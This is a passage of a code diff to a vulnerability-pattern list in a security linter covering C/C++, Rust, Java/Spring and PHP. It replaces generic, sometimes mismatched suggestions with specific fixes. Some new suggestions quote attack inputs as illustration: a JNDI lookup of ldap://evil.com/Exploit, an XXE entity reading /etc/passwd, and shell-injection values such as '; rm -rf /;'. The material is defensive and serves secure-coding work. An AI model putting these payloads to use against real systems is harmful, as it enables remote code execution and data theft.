         "message": "Zero-length or unsized array declaration without explicit size leads to undefined behavior",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Zero-length or unsized array declaration without explicit size leads to undefined behavior. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "int arr[0] or int arr[] as struct member is a flexible array member (C99) but zero-length arrays are UB in C++. In C: use struct { int n; int data[]; } with malloc(sizeof(struct) + n*sizeof(int)). In C++: use std::vector."
             ),
     },
     {
@@ -25710,7 +25710,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Fixed-size stack buffer followed immediately by copy operation without explicit size check",
         "severity": Severity.WARN,
             "suggestion": (
-                "Buffer overflow risk — writing beyond allocated bounds enables code execution. Use bounds-checked functions: strncpy instead of strcpy, snprintf instead of sprintf. In modern languages: use slices with length checks, avoid unsafe pointer arithmetic. Enable compiler protections: -fstack-protector-strong, ASLR, and DEP."
+                "char buf[256]; memcpy(buf, src, src_len); — if src_len > 256, buffer overflow occurs. Add: if (src_len > sizeof(buf)) { return ERROR; } before the copy. Or use dynamic allocation: char *buf = malloc(src_len); with free after use."
             ),
     },
     {
@@ -25719,7 +25719,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Memory mapped with both write and execute permissions enables code injection attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "mmap with PROT_WRITE | PROT_EXEC creates writable-executable memory — an attacker writes shellcode then executes it. Use W^X: mmap with PROT_WRITE, write data, then mprotect to PROT_READ | PROT_EXEC (remove write). Never have both simultaneously."
             ),
     },
     {
@@ -25728,7 +25728,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Variadic functions bypass type checking; prefer type-safe alternatives",
         "severity": Severity.INFO,
             "suggestion": (
-                "Type safety violation. Avoid type coercion (== in JS, implicit casts), use strict comparison (=== in JS, isinstance() in Python). Add type annotations and validate at boundaries with Pydantic (Python), Zod (TypeScript), or similar validation libraries."
+                "Variadic functions (printf, scanf, custom ...) bypass type checking — printf('%s', int_val) causes UB. Use type-safe alternatives: std::format (C++20), templates, or overloaded functions. For C: use _Generic macros or explicit typed argument structs."
             ),
     },
     {
@@ -25737,7 +25737,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "std::auto_ptr is deprecated and has broken copy semantics; use std::unique_ptr instead",
         "severity": Severity.WARN,
             "suggestion": (
-                "Deprecated API or pattern — will be removed in a future version, potentially breaking your application without warning. Migrate to the recommended replacement now. Check the library's migration guide for the specific replacement and any behavioral differences."
+                "std::auto_ptr copies transfer ownership — assigning to a second auto_ptr leaves the first null. This breaks containers and copy semantics. Replace with std::unique_ptr (move-only, explicit ownership transfer) or std::shared_ptr (reference-counted sharing)."
             ),
     },
     {
@@ -25746,7 +25746,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Casting to void* or char* discards type information and bypasses type safety",
         "severity": Severity.WARN,
             "suggestion": (
-                "SQL injection via string interpolation. The database driver sees the user's input as SQL code, not data. Use parameterized queries: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,)). The %s placeholder is never interpreted as SQL — the driver sends it as a bound parameter. This applies to all SQL variants: %s (psycopg2), ? (sqlite3), $1 (asyncpg)."
+                "Casting to void*/char* loses type information — any subsequent cast back to the wrong type is UB. Use std::variant, std::any, or inheritance with dynamic_cast. In C: use tagged unions (struct with type enum + union of typed pointers)."
             ),
     },
     {
@@ -25755,7 +25755,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Union with overlapping primitive types may cause type punning and undefined behavior",
         "severity": Severity.INFO,
             "suggestion": (
-                "Type safety violation. Avoid type coercion (== in JS, implicit casts), use strict comparison (=== in JS, isinstance() in Python). Add type annotations and validate at boundaries with Pydantic (Python), Zod (TypeScript), or similar validation libraries."
+                "Union type punning (write float, read int) is undefined behavior in C++. Use memcpy(&int_val, &float_val, sizeof(float)) which is well-defined. In C: type punning through unions is implementation-defined but common. Use std::bit_cast in C++20."
             ),
     },
     {
@@ -25764,7 +25764,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Struct packing to 1 byte alignment causes performance degradation and potential misaligned access",
         "severity": Severity.INFO,
             "suggestion": (
-                "SQL injection risk. User input in query strings is interpreted as SQL code. Use parameterized queries with your driver's placeholder syntax: %s (Python), ? (JS/Go), $1 (PostgreSQL). The fix is always the same: separate data from code by using bound parameters."
+                "#pragma pack(1) or __attribute__((packed)) causes misaligned loads — a bus error on ARM, and 2-4x slower reads on x86. Only pack for exact wire format/file format structures. Access packed fields via memcpy to avoid misaligned reads."
             ),
     },
     {
@@ -25773,7 +25773,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "string_view from temporary string creates dangling reference after statement ends",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: string_view from temporary string creates dangling reference after statement ends. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "std::string_view sv = std::string('temp'); — the string is destroyed at the semicolon, sv is dangling. string_view must refer to data with a longer lifetime. Fix: store the string first: std::string s = 'temp'; std::string_view sv = s;"
             ),
     },
     {
@@ -25782,7 +25782,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Box::from_raw requires the pointer to have been originally created by Box::into_raw",
         "severity": Severity.WARN,
             "suggestion": (
-                "Dependency security issue. Pin versions in requirements.txt/package.json (no * or latest). Audit with: pip-audit (Python), npm audit (JS), govulncheck (Go). Enable Dependabot or Renovate for automated updates. Verify package names — typosquatting is common."
+                "Box::from_raw(ptr) takes ownership — it will free ptr on drop. Only valid if ptr came from Box::into_raw on the same type. Using it on malloc'd memory or a pointer from another source causes double-free or wrong-allocator-free UB."
             ),
     },
     {
@@ -25791,7 +25791,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "std::mem::forget prevents drop from running, causing resource leaks for types with Drop",
         "severity": Severity.WARN,
             "suggestion": (
-                "Resource leak — opened resources (files, connections, sockets) not closed on all code paths. Use context managers: with open(path) as f: (Python), try-with-resources (Java), defer conn.Close() (Go). For async: use async with and ensure cleanup in finally blocks. Resources must be closed even when exceptions occur."
+                "std::mem::forget(handle) prevents Drop from running — file handles stay open, locks stay held, memory leaks. Use ManuallyDrop for intentional drop prevention with explicit cleanup. forget should only be used when transferring ownership to FFI."
             ),
     },
     {
@@ -25800,7 +25800,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "setjmp/longjmp bypass RAII destructors in C++ and corrupt stack unwinding",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: setjmp/longjmp bypass RAII destructors in C++ and corrupt stack unwinding. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "setjmp/longjmp in C++ skip destructors — RAII objects (locks, file handles, smart pointers) are not cleaned up. Use exceptions for C++ error handling. In C: setjmp/longjmp are acceptable but ensure all resources are in the jmp_buf's scope."
             ),
     },
     {
@@ -25809,7 +25809,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Deserializing objects from network input enables remote code execution via gadget chains",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "Java ObjectInputStream.readObject() instantiates arbitrary classes from the stream — crafted payloads execute code via gadget chains (ysoserial). Use allowlist-based deserialization: ObjectInputFilter.Config.setSerialFilter() in Java 9+. Or use JSON/protobuf instead."
             ),
     },
     {
@@ -25818,7 +25818,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "JNDI lookup with user-controlled input enables remote class loading",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "JNDI lookup with user input (InitialContext.lookup(userInput)) enables remote class loading via ldap://evil/Exploit. This is the Log4Shell attack vector (CVE-2021-44228). Never pass user input to JNDI lookups. Use explicit, hardcoded JNDI names."
             ),
     },
     {
@@ -25827,7 +25827,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "JNDI lookup with user-supplied name enables JNDI injection and remote code execution",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "ctx.lookup(request.getParameter('name')) loads arbitrary JNDI resources. An attacker sends name=ldap://evil.com/Exploit to load remote classes. Validate against an allowlist of known JNDI names. Disable remote class loading: com.sun.jndi.ldap.object.trustURLCodebase=false."
             ),
     },
     {
@@ -25836,7 +25836,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Spring @RequestMapping without explicit HTTP method accepts all methods including dangerous ones",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Spring @RequestMapping without explicit HTTP method accepts all methods including dangerous ones. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "@RequestMapping without method accepts GET, POST, PUT, DELETE, PATCH, HEAD, OPTIONS. Use specific annotations: @GetMapping, @PostMapping, @DeleteMapping. This prevents: GET requests modifying state, OPTIONS leaking endpoints, and HEAD timing attacks."
             ),
     },
     {
@@ -25845,7 +25845,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Hibernate DDL auto mode in production will modify or destroy database schema automatically",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: Hibernate DDL auto mode in production will modify or destroy database schema automatically. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "Hibernate ddl-auto: update/create/create-drop in production modifies schema automatically — an entity field rename drops the old column. Use: ddl-auto: validate (verify schema matches entities) in production. Apply schema changes via Flyway or Liquibase migrations."
             ),
     },
     {
@@ -25854,7 +25854,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Dynamic class loading from user input enables arbitrary class instantiation",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "Class.forName(request.getParameter('class')) instantiates any class on the classpath. An attacker loads Runtime.exec() or ProcessBuilder. Validate against an explicit allowlist: ALLOWED_CLASSES = Set.of('UserHandler', 'OrderHandler'); if (!ALLOWED_CLASSES.contains(name)) throw."
             ),
     },
     {
@@ -25863,7 +25863,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Reflective method lookup from user input enables arbitrary method invocation",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "getClass().getMethod(userInput).invoke() calls arbitrary methods. An attacker invokes: Runtime.getRuntime().exec('cmd'). Use a dispatch map: Map<String, Runnable> handlers = Map.of('process', this::process); handlers.get(validated_action).run();"
             ),
     },
     {
@@ -25872,7 +25872,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Spring @CrossOrigin with wildcard or default allows all origins for this endpoint",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Spring @CrossOrigin with wildcard or default allows all origins for this endpoint. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "@CrossOrigin or @CrossOrigin(origins='*') allows all origins for the annotated endpoint. Specify: @CrossOrigin(origins='https://app.example.com', allowedHeaders={'Content-Type','Authorization'}, methods={RequestMethod.GET}). Apply at the controller level for consistency."
             ),
     },
     {
@@ -25881,7 +25881,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Reflection setAccessible(true) bypasses Java access control and encapsulation",
         "severity": Severity.WARN,
             "suggestion": (
-                "Follow the principle of least privilege: grant only the minimum permissions required for the operation. Validate authorization on every request, not just authentication. Use role-based access control (RBAC) with specific permissions per role."
+                "field.setAccessible(true) bypasses Java's access modifiers — it reads private fields and calls private methods. If you need private access: redesign the API to expose needed data. For testing: use package-private access or test-specific constructors, not reflection."
             ),
     },
     {
@@ -25890,7 +25890,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Runtime.exec with string argument is vulnerable to command injection; use ProcessBuilder",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "Runtime.exec('cmd /c ' + userInput) passes the entire string to the shell. Use ProcessBuilder: new ProcessBuilder('command', 'arg1', 'arg2').start() — each argument is separate, preventing shell injection. Never concatenate user input into Runtime.exec strings."
             ),
     },
     {
@@ -25899,7 +25899,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "XMLInputFactory without disabling DTD support is vulnerable to XXE attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "XMLInputFactory without disabling DTD/external entities enables XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>. Set: factory.setProperty(XMLInputFactory.SUPPORT_DTD, false); factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);"
             ),
     },
     {
@@ -25908,7 +25908,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Spring @Cacheable without explicit key may produce cache collisions",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Spring @Cacheable without explicit key may produce cache collisions. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "@Cacheable without explicit key uses all method parameters — different parameter combinations may collide. Set: @Cacheable(value='users', key='#userId'). For complex keys: @Cacheable(key='{#tenantId, #userId}'). Use keyGenerator for custom serialization."
             ),
     },
     {
@@ -25917,7 +25917,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Database password hardcoded in Spring configuration; use environment variables or vault",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Hardcoded secrets in source code are visible to anyone with repository access and persist in git history forever. Use environment variables: os.environ['API_KEY']. For production: use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager). If committed: rotate the secret immediately — git history cannot be reliably purged."
+                "spring.datasource.password=secret in application.properties is committed to git. Use environment variable: spring.datasource.password=${DB_PASSWORD}. For production: use Spring Cloud Vault, AWS Secrets Manager, or Kubernetes Secrets mounted as env vars."
             ),
     },
     {
@@ -25926,7 +25926,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Transaction propagation NOT_SUPPORTED suspends existing transaction causing data inconsistency",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Transaction propagation NOT_SUPPORTED suspends existing transaction causing data inconsistency. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "@Transactional(propagation=NOT_SUPPORTED) suspends the caller's transaction — if the caller writes data expecting ACID guarantees, NOT_SUPPORTED breaks consistency. Use REQUIRED (default) or REQUIRES_NEW if you need an independent transaction."
             ),
     },
     {
@@ -25935,7 +25935,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "java.util.Random is not cryptographically secure; use SecureRandom for security operations",
         "severity": Severity.WARN,
             "suggestion": (
-                "Math.random() / random.random() are not cryptographically secure — output is predictable. For tokens, keys, nonces: use secrets.token_hex(32) (Python), crypto.randomBytes(32) (Node.js), crypto/rand.Read() (Go). For UUIDs: use uuid4 (random) not uuid1 (MAC-based)."
+                "java.util.Random is a linear congruential generator — output is predictable after observing ~600 values. For security: SecureRandom sr = new SecureRandom(); sr.nextBytes(bytes);. SecureRandom uses OS entropy and is unpredictable."
             ),
     },
     {
@@ -25944,7 +25944,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Script engine eval with user input enables arbitrary code execution",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Cross-site scripting (XSS) via unsanitized user input in HTML context. Sanitize output based on context: HTML body: escape <>&\'' characters. HTML attributes: quote and escape. JavaScript: JSON.stringify(). URL: encodeURIComponent(). Use DOMPurify for HTML, or framework auto-escaping (React JSX, Vue templates)."
+                "ScriptEngine.eval(userInput) executes arbitrary JavaScript/Groovy/Python in the JVM. An attacker sends: new java.lang.ProcessBuilder('rm','-rf','/').start(). Use a sandboxed evaluator with Nashorn's --no-java flag or a dedicated expression language (SpEL with SimpleEvaluationContext)."
             ),
     },
     {
@@ -25953,7 +25953,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "CSRF protection disabled in Spring Security allows cross-site request forgery attacks",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Security or quality issue: CSRF protection disabled in Spring Security allows cross-site request forgery attacks. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "http.csrf().disable() removes CSRF protection on all endpoints. If your API uses cookies: CSRF is required. Configure: http.csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()) for SPA compatibility. For stateless JWT APIs: CSRF is not needed."
             ),
     },
     {
@@ -25962,7 +25962,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Administrative endpoint configured with permitAll bypasses authentication",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Authentication or authorization vulnerability. Verify: authentication checks on every protected endpoint, authorization checks for resource access (not just authentication), secure token storage, and proper session invalidation on logout."
+                "http.authorizeRequests().antMatchers('/admin/**').permitAll() allows unauthenticated access to admin endpoints. Use: .antMatchers('/admin/**').hasRole('ADMIN'). Order matters: most restrictive patterns first. Use .authenticated() as the default fallback."
             ),
     },
     {
@@ -25971,7 +25971,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Weak or deprecated cipher algorithm; use AES-GCM or AES-CBC with HMAC",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Weak or misconfigured cryptography. Use modern algorithms: AES-256-GCM for symmetric encryption, RSA-2048+ or Ed25519 for asymmetric, SHA-256+ for hashing. Use established libraries (cryptography for Python, crypto for Node.js) — never implement crypto yourself."
+                "DES (56-bit), 3DES (Sweet32 attack), and Blowfish (64-bit block) are deprecated. Use: Cipher.getInstance('AES/GCM/NoPadding') with 256-bit keys. GCM provides authenticated encryption — no separate MAC needed. Set tag length to 128 bits."
             ),
     },
     {
@@ -25980,7 +25980,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Empty TrustManager.checkServerTrusted disables SSL certificate validation entirely",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "TrustManager with empty checkServerTrusted() accepts any certificate, including MITM certificates. Use the default TrustManagerFactory: TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm()). For self-signed CAs: load the CA into a custom KeyStore."
             ),
     },
     {
@@ -25989,7 +25989,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Path variable with resource ID without @PreAuthorize enables IDOR attacks",
         "severity": Severity.WARN,
             "suggestion": (
-                "User input in file paths enables path traversal. An input of ../../etc/passwd reads system files. Use os.path.realpath() and verify the resolved path starts with your allowed base directory: resolved = os.path.realpath(os.path.join(base, user_input)); assert resolved.startswith(os.path.realpath(base)). Use pathlib for cleaner path handling."
+                "@GetMapping('/orders/{id}') without @PreAuthorize('hasPermission(#id, 'Order', 'read')') allows any authenticated user to access any order. Add ownership check: @PreAuthorize('@orderSecurity.isOwner(authentication, #id)') with a custom PermissionEvaluator."
             ),
     },
     {
@@ -25998,7 +25998,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Deserializing YAML or JSON from user input without type restriction enables code execution",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "ObjectMapper.enableDefaultTyping() or @JsonTypeInfo with user input allows polymorphic deserialization — Jackson instantiates arbitrary classes. Use: @JsonTypeInfo with @JsonSubTypes listing exact allowed types. Disable DefaultTyping in production ObjectMapper configuration."
             ),
     },
     {
@@ -26007,7 +26007,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Spring @Scheduled or @Async method without @Transactional may have unexpected persistence",
         "severity": Severity.INFO,
             "suggestion": (
-                "Security or quality issue: Spring @Scheduled or @Async method without @Transactional may have unexpected persistence. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "@Scheduled method without @Transactional uses auto-commit per statement — partial failures leave inconsistent data. Add @Transactional if the method does multiple writes. For @Async: the calling transaction does not propagate, so the async method needs its own."
             ),
     },
     {
@@ -26016,7 +26016,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "JPA query built with string concatenation enables SQL or JPQL injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "String concatenation in SQL queries allows injection. An input of ' OR 1=1-- returns all rows. Use parameter binding: db.execute('SELECT * FROM t WHERE col = ?', [value]). Never build SQL with + or string joining. ORMs have safe query builders — use them."
+                "em.createQuery('SELECT u FROM User u WHERE u.name = ' + name) builds JPQL with concatenation. Use: em.createQuery('SELECT u FROM User u WHERE u.name = :name').setParameter('name', name). Named parameters in JPQL are parameterized by the JPA provider."
             ),
     },
     {
@@ -26025,7 +26025,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Sensitive Spring @Value property has a default value which may be used if env var is missing",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Sensitive Spring @Value property has a default value which may be used if env var is missing. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "@Value('${db.password:defaultPass}') — if the env var is missing, 'defaultPass' is used silently in production. Remove the default: @Value('${db.password}') which fails fast if the var is missing. For optional config: use @Value with explicit null handling."
             ),
     },
     {
@@ -26034,7 +26034,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "ProcessBuilder invoking shell interpreter may enable command injection via arguments",
         "severity": Severity.WARN,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "new ProcessBuilder('/bin/sh', '-c', command + userInput) passes input to the shell. Use: new ProcessBuilder('program', arg1, arg2) without shell — each argument is separate. If shell is needed: validate input against ^[a-zA-Z0-9_.-]+$ regex."
             ),
     },
     {
@@ -26043,7 +26043,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "JPA @Column with columnDefinition bypasses Hibernate DDL validation",
         "severity": Severity.INFO,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "@Column(columnDefinition = 'VARCHAR(255)') bypasses Hibernate's DDL validation — the string is injected raw into DDL. If column customization is needed: use Flyway/Liquibase migrations instead of @Column(columnDefinition). Hibernate should validate schema, not create it."
             ),
     },
     {
@@ -26052,7 +26052,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Spring SpEL evaluation of user input enables remote code execution",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "SpEL.parseExpression(userInput).getValue() evaluates arbitrary Spring expressions — an attacker sends T(java.lang.Runtime).getRuntime().exec('cmd'). Use SimpleEvaluationContext which disables type references, constructors, and bean references."
             ),
     },
     {
@@ -26061,7 +26061,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Scheduled task with very low fixedRate may overwhelm system resources",
         "severity": Severity.WARN,
             "suggestion": (
-                "Security or quality issue: Scheduled task with very low fixedRate may overwhelm system resources. Review the flagged code pattern and apply the appropriate fix for your language and framework. Consult OWASP guidelines and your framework's security documentation for the recommended approach."
+                "@Scheduled(fixedRate=100) runs every 100ms — 600 invocations/minute. If each invocation does I/O or DB access, this overwhelms resources. Use fixedRate=60000 (1 min) minimum for polling. Use fixedDelay instead of fixedRate if processing time varies."
             ),
     },
     {
@@ -26070,7 +26070,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Jackson ObjectMapper without explicit type handling may be vulnerable to polymorphic deserialization",
         "severity": Severity.INFO,
             "suggestion": (
-                "Unsafe deserialization can execute arbitrary code. pickle.loads(), yaml.load(), PHP unserialize(), and Java ObjectInputStream.readObject() all allow code execution from crafted payloads. Use safe alternatives: json.loads() for data, yaml.safe_load() for YAML, or validated schemas with explicit type mappings. Never deserialize untrusted data with native serialization."
+                "ObjectMapper without explicit type handling + @JsonTypeInfo on polymorphic types enables deserialization attacks. Set: objectMapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY) with a PolymorphicTypeValidator that allowlists specific classes."
             ),
     },
     {
@@ -26079,7 +26079,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Remote file inclusion from URL enables execution of attacker-controlled code",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "include(userInput) or require(url) loads and executes remote code. File inclusion from URLs enables RCE. Disable: allow_url_include=Off in php.ini. Validate paths against an allowlist of local files. Use realpath() and verify the result is within your application directory."
             ),
     },
     {
@@ -26088,7 +26088,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "PHP loose comparison (==) with user input causes type juggling bypass (use === instead)",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "PHP == performs type juggling: '0e123' == '0e456' is true (both are 0 in scientific notation), '0' == false is true. Use === for all comparisons: if ($input === $expected). This prevents authentication bypasses where '0e...' hashes compare equal."
             ),
     },
     {
@@ -26097,7 +26097,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "extract() on superglobals creates variables from user input enabling variable injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Input validation must happen at system boundaries. Validate: type (is it a string/number?), format (does it match expected pattern?), range (is it within bounds?), and length. Use allowlists over denylists. Validate on the server — client validation is for UX only."
+                "extract($_POST) creates variables from user input: $_POST['isAdmin'] becomes $isAdmin=true. Never use extract() on user input. Use specific assignments: $name = $_POST['name'] ?? ''; $email = $_POST['email'] ?? '';"
             ),
     },
     {
@@ -26106,7 +26106,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "Shell execution with variable argument enables command injection; use escapeshellarg",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "system('grep ' . $input . ' file.txt') enables injection: input = '; rm -rf /;'. Use escapeshellarg(): system('grep ' . escapeshellarg($input) . ' file.txt'). escapeshellarg wraps in single quotes and escapes embedded quotes. Better: use proc_open with argument array."
             ),
     },
     {
@@ -26115,7 +26115,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "OS command execution with user input directly interpolated enables command injection",
         "severity": Severity.BLOCK,
             "suggestion": (
-                "Command injection via unsanitized input in shell execution. Never construct shell commands from user input. Use: subprocess.run() with argument list (Python), execFile() (Node.js), exec.Command() with separate args (Go). If shell is unavoidable: use shlex.quote() (Python) or shell-escape library to sanitize each argument."
+                "exec('ls ' . $_GET['dir']) injects via dir='; cat /etc/passwd'. Use escapeshellarg: exec('ls ' . escapeshellarg($dir)). For complex commands: use proc_open(['ls', $dir]) which bypasses the shell entirely. Never interpolate user input into shell commands."
             ),
     },
     {
@@ -26124,7 +26124,7 @@ ANTI_PATTERNS: list[dict[str, str]] = [
         "message": "preg_replace with /e modifier evaluates replacement as PHP code enabling code injection",
         "severity": Severity.BLOCK,
             "suggestion": (
